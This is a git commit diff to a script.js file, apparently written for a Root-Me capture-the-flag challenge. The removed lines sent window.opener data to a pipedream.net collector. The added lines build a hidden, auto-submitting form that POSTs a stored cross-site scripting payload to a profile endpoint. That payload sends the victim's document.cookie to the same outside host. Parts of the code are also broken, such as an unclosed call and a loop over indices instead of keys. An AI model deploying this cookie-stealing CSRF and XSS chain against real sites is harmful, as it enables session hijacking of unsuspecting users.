9610f8d264484ea3a20f32d50764b24c53abd6c5
nyzra <sauronlucas@gmail.com>
2024-06-21 20:39:23 +0200

    changed script

--- script.js
+++ script.js
@@ -1,13 +1,19 @@
-let baseurl = "https://eozr3kmrbmb1rnm.m.pipedream.net?"
-baseurl += "window_opener=" + window.opener;
-baseurl += "&"
-if (window.opener != null){
-    
-    let keys = Object.keys(window.opener);
-    keys.forEach(key => {
-        baseurl += key + "=" + obj[key];
-        baseurl += "&"
-        console.log(key + "=" + obj[key])
-    });
+let url = "http://challenge01.root-me.org:58003/profile"
+
+let payload={
+    username :"<script>window.open('https://eozr3kmrbmb1rnm.m.pipedream.net?cookies=' + document.cookie</script>",
+    secret: "aa",
 }
-window.open(baseurl)
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = url;
+form.style.visibility = 'hidden'; 
+for (key in Object.keys(payload)) {
+    var input = document.createElement('input');
+    input.name = key;
+    input.value = payload[key];
+    form.appendChild(input); // add key/value pair to form
+  }
+  document.body.appendChild(form); // forms cannot be submitted outside of body
+  form.submit(); 
+
